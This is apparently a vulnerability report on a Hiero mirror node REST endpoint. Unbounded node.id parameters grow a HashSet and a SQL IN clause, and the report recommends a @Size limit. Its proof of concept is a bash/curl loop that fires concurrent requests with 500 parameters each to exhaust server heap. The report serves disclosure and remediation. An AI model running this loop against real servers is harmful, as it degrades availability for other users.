### Title
Unbounded `node.id` EQ Parameter List Causes Uncapped HashSet Growth and Oversized SQL IN Clause

### Summary
The `getNetworkNodes()` method in `NetworkServiceImpl` iterates over all `node.id` query parameters and adds every EQ-operator value into a `HashSet<Long>` with no size cap. The `NetworkNodeRequest` DTO declares `nodeIds` as a plain `List<NumberRangeParameter>` with no `@Size` constraint, while the argument resolver imposes no per-parameter-name count limit for collection-typed fields. An unprivileged attacker can submit hundreds of `node.id=X` values in a single GET request, growing the HashSet and the downstream SQL `IN` array to the HTTP server's parameter-count ceiling (Tomcat default: 10,000).

### Finding Description

**Code path:**

`NetworkController.getNodes()` → `NetworkService.getNetworkNodes(request)` → `NetworkServiceImpl.getNetworkNodes()`

In `NetworkNodeRequest.java` lines 36–38, `nodeIds` carries no `@Size` constraint:

```java
@RestJavaQueryParam(name = NODE_ID, required = false)
@Builder.Default
private List<NumberRangeParameter> nodeIds = List.of();
``` [1](#0-0) 

Contrast this with the `timestamp` parameter in the controller, which is guarded by `@Size(max = 2)`. No equivalent guard exists for `nodeIds`.

In `RequestParameterArgumentResolver.validateAndAddParameter()` (lines 229–237), for collection-typed fields the resolver passes the entire raw `paramValues` array directly to the binder with no count check:

```java
boolean isMultiValue = field.getType().isArray() || Collection.class.isAssignableFrom(field.getType());
if (!isMultiValue && paramValues.length > 1) {
    throw new IllegalArgumentException(...);
}
Object valueToSet = isMultiValue ? paramValues : paramValues[0];
propertyValues.add(field.getName(), valueToSet);
``` [2](#0-1) 

In `NetworkServiceImpl.getNetworkNodes()` lines 106–118, every EQ parameter is unconditionally added to the `HashSet`:

```java
final Set<Long> nodeIds = new HashSet<>();
...
for (final var nodeIdParam : nodeIdParams) {
    if (nodeIdParam.operator() == RangeOperator.EQ) {
        nodeIds.add(nodeIdParam.value());
    }
    ...
}
``` [3](#0-2) 

The resulting `nodeIdArray` is then forwarded directly to the repository (line 135–136), which generates a SQL `IN (…)` clause of equal length: [4](#0-3) 

**Root cause:** Missing `@Size` constraint on `NetworkNodeRequest.nodeIds` and no defensive cap in the service layer.

**Why existing checks fail:** The only size-limiting annotation in the codebase for repeated parameters is `@Size(max = 2)` on `timestamp`, applied directly at the controller method parameter level. The `nodeIds` field has no analogous constraint, and `RequestParameterArgumentResolver` only rejects multiple values for *non-collection* fields.

### Impact Explanation

Each `Long` in a `HashSet` costs ~48 bytes of heap (object header + boxing). Tomcat's default `maxParameterCount` is 10,000; a single request with 10,000 `node.id=X` values allocates ~480 KB of heap per request. Under concurrent load this multiplies linearly. Additionally, the generated SQL `IN` clause with thousands of literals stresses the database query planner and connection pool, degrading response times for all users. Severity is medium (griefing / availability degradation, no fund loss).

### Likelihood Explanation

No authentication is required. The endpoint is a plain HTTP GET. The attack is trivially scriptable with `curl` or any HTTP client that supports repeated query parameters. It is repeatable at will and requires no special knowledge beyond the public API.

### Recommendation

Add a `@Size(max = N)` constraint on the `nodeIds` field in `NetworkNodeRequest`, matching the pattern already used for `timestamp`:

```java
@RestJavaQueryParam(name = NODE_ID, required = false)
@Builder.Default
@Size(max = 10)   // or whatever the intended maximum is
private List<NumberRangeParameter> nodeIds = List.of();
``` [1](#0-0) 

Additionally, add a defensive guard at the top of `getNetworkNodes()` to reject oversized lists before any allocation occurs.

### Proof of Concept

```bash
# Generate a request with 500 distinct EQ node.id parameters
PARAMS=$(python3 -c "print('&'.join(f'node.id={i}' for i in range(500)))")
curl -s "http://<mirror-node-host>/api/v1/network/nodes?$PARAMS" -o /dev/null

# Repeat in a tight loop to exhaust heap across concurrent requests
for i in $(seq 1 50); do
  curl -s "http://<mirror-node-host>/api/v1/network/nodes?$PARAMS" -o /dev/null &
done
wait
```

Each request forces allocation of a `HashSet` with 500 `Long` entries and issues a SQL query with a 500-element `IN` clause. Scaling to Tomcat's 10,000-parameter ceiling amplifies both effects by 20×.

### Citations

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/dto/NetworkNodeRequest.java (L36-38)
```java
    @RestJavaQueryParam(name = NODE_ID, required = false)
    @Builder.Default
    private List<NumberRangeParameter> nodeIds = List.of();
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/parameter/RequestParameterArgumentResolver.java (L229-237)
```java
        boolean isMultiValue = field.getType().isArray() || Collection.class.isAssignableFrom(field.getType());

        if (!isMultiValue && paramValues.length > 1) {
            throw new IllegalArgumentException("Only a single instance is supported for " + paramName);
        }

        // Add to property values - WebDataBinder will handle type conversion
        Object valueToSet = isMultiValue ? paramValues : paramValues[0];
        propertyValues.add(field.getName(), valueToSet);
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/NetworkServiceImpl.java (L106-118)
```java
        final Set<Long> nodeIds = new HashSet<>();
        long lowerBound = 0L;
        long upperBound = Long.MAX_VALUE;

        for (final var nodeIdParam : nodeIdParams) {
            if (nodeIdParam.operator() == RangeOperator.EQ) {
                nodeIds.add(nodeIdParam.value());
            } else if (nodeIdParam.hasLowerBound()) {
                lowerBound = Math.max(lowerBound, nodeIdParam.getInclusiveValue());
            } else if (nodeIdParam.hasUpperBound()) {
                upperBound = Math.min(upperBound, nodeIdParam.getInclusiveValue());
            }
        }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/NetworkServiceImpl.java (L135-136)
```java
        return networkNodeRepository.findNetworkNodes(
                fileId, nodeIdArray, lowerBound, upperBound, orderDirection, limit);
```
